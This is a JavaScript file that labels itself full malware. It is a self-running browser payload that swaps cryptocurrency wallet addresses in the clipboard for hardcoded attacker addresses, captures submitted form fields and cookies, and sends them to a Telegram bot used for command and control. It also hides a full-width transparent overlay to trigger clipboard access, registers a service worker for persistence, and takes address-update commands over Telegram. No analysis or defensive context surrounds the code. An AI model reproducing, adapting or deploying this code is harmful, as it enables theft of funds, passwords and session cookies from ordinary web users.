// payload.js - Full malware (clipboard hijack, credential theft, Telegram C2)
(function() {
    const attacker = {
        btc: "bc1qa6qfkhgy4np2lccstvfhnnzmlsq88ef5f02uxs",
        ltc: "ltc1qpqz9zunfah5wf5dwuprth55lyvrdlskngq7284",
        eth: "0xd213f35fad26a1586d9b3121d4b6f85dbb265d4f",
        sol: "YkjxXNNGAwG7qU8MhJrNZH1ERBkPtWeaz3EoigZchpw",
        xrp: "rGCVYzTYMHSdsZ4PBnyi1JfzxWoPTmo3U2",
        doge: "DBqxDYXCjLoTbeHLEtVc2cxkUMmudtsXuL",
        trx: "TSyhufUNhhiGB13ZpYPdbAuRp48hUpJ2st",
        ton: "UQDwkLSwJLiGeE4TKoacFLtFYL1YIbqC86YvOsYCjJh7meOL"
    };
    const patterns = {
        btc: /\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b/g,
        ltc: /\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,}\b/g,
        eth: /\b0x[a-fA-F0-9]{40}\b/g,
        sol: /\b[1-9A-HJ-NP-Za-km-z]{32,44}\b/g,
        xrp: /\br[0-9a-zA-Z]{24,34}\b/g,
        doge: /\bD{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}\b/g,
        trx: /\bT[A-Za-z0-9]{33}\b/g,
        ton: /\bUQ[A-Za-z0-9_-]{40,}\b/g
    };
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    const CHAT_ID = "YOUR_CHAT_ID_HERE";
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    function sendToTelegram(msg) {
        let xhr = new XMLHttpRequest();
        xhr.open("POST", TELEGRAM_API, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: msg }));
    }
    let hijackInterval = null;
    function startHijacking() {
        if (hijackInterval) return;
        hijackInterval = setInterval(() => {
            navigator.clipboard.readText().then(text => {
                if (!text) return;
                for (let [coin, regex] of Object.entries(patterns)) {
                    if (regex.test(text)) {
                        let newText = text.replace(regex, attacker[coin]);
                        navigator.clipboard.writeText(newText);
                        sendToTelegram(`[CLIP] ${coin} | ${text} -> ${newText}`);
                        break;
                    }
                }
            }).catch(e => {});
        }, 800);
    }
    function injectClipboardTrigger() {
        let btn = document.createElement("div");
        btn.style.position = "fixed";
        btn.style.bottom = "0";
        btn.style.left = "0";
        btn.style.width = "100%";
        btn.style.height = "50px";
        btn.style.backgroundColor = "rgba(0,0,0,0.01)";
        btn.style.zIndex = "999999";
        document.body.appendChild(btn);
        btn.addEventListener("click", () => { startHijacking(); btn.remove(); });
        document.addEventListener("click", function once() { startHijacking(); document.removeEventListener("click", once); });
    }
    function stealCredentials() {
        document.addEventListener("submit", function(e) {
            let form = e.target;
            let data = {};
            for (let input of form.querySelectorAll("input")) {
                if (input.type === "password" || input.type === "text" || input.type === "email") {
                    data[input.name || input.id] = input.value;
                }
            }
            if (Object.keys(data).length) sendToTelegram(`[FORM] ${window.location.href}\n${JSON.stringify(data)}`);
        });
        if (document.cookie) sendToTelegram(`[COOKIE] ${window.location.href}\n${document.cookie}`);
        setInterval(() => {
            let newCookies = document.cookie;
            if (newCookies !== document.cookie) sendToTelegram(`[COOKIE_UPDATE] ${window.location.href}\n${newCookies}`);
        }, 5000);
    }
    function installServiceWorker() {
        if ('serviceWorker' in navigator) {
            let swCode = `self.addEventListener('install', e => self.skipWaiting()); self.addEventListener('activate', e => e.waitUntil(clients.claim()));`;
            let blob = new Blob([swCode], {type: 'application/javascript'});
            let url = URL.createObjectURL(blob);
            navigator.serviceWorker.register(url).then(() => sendToTelegram("[PERSIST] SW installed"));
        }
    }
    function listenForTelegramCommands() {
        let lastUpdate = 0;
        setInterval(() => {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdate+1}&timeout=5`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result) {
                        data.result.forEach(up => {
                            lastUpdate = up.update_id;
                            let msg = up.message?.text;
                            if (msg && msg.startsWith("/update ")) {
                                let parts = msg.split(" ");
                                if (parts.length === 3) {
                                    let coin = parts[1].toLowerCase();
                                    let newAddr = parts[2];
                                    if (attacker[coin]) attacker[coin] = newAddr;
                                }
                            }
                        });
                    }
                }).catch(e => {});
        }, 30000);
    }
    function main() {
        injectClipboardTrigger();
        stealCredentials();
        installServiceWorker();
        listenForTelegramCommands();
        sendToTelegram("[MALWARE] Deployed on " + navigator.userAgent);
    }
    if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", main);
    else main();
})();